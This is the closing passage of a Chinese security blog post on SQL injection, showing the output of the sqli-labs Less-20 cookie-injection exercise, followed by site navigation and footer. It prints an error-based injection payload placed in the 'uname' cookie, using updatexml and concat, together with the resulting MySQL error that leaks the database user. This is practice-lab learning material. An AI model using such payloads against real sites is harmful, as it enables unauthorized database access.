class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;YOUR IP ADDRESS IS : 113.77.238.53&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&lt;font color= &quot;orange&quot; font size = 5 &gt;YOUR COOKIE : uname = admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &apos;1&apos;=&apos;1 and expires: Thu 17 Jan 2019 - 06:37:48&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/01/17/kp8vz4.png" alt="kp8vz4.png"></p>
+<p>转载请声明：转自422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projects</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&text=Secondary injection of sql injection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&is_video=false&description=Secondary injection of sql injection"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Secondary injection of sql injection&body=Check out this article: http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&title=Secondary injection of sql injection"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/01/17/Secondary-injection-of-sql-injection/&name=Secondary injection of sql injection&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projects</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
